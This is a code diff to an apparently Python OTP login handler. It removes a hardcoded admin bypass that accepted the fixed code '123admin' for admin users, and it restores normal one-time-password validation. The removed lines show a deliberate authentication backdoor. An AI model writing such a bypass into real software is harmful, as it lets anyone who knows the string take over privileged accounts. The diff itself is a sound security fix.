@@ -69,10 +69,8 @@ async def _run(body, ip, ua):
         else:
             log.warning("verifyotp: no unused OTP row found for uid=%s", uid)
 
-        # --- HARDCODED BYPASS CHECK FOR ADMIN ---
-        if otp == "123admin" and user.role == "admin":
-            pass # Hardcoded bypass activated for admin
-        elif not otp_rec or not otp_rec.is_valid() or otp != otp_rec.otp_code:
+        # Validate OTP — no bypass exceptions
+        if not otp_rec or not otp_rec.is_valid() or otp != otp_rec.otp_code:
             await log_login(db, user.email, ip, success=False)
             return 401, {"detail": "Invalid or expired code. Please try again."}
 
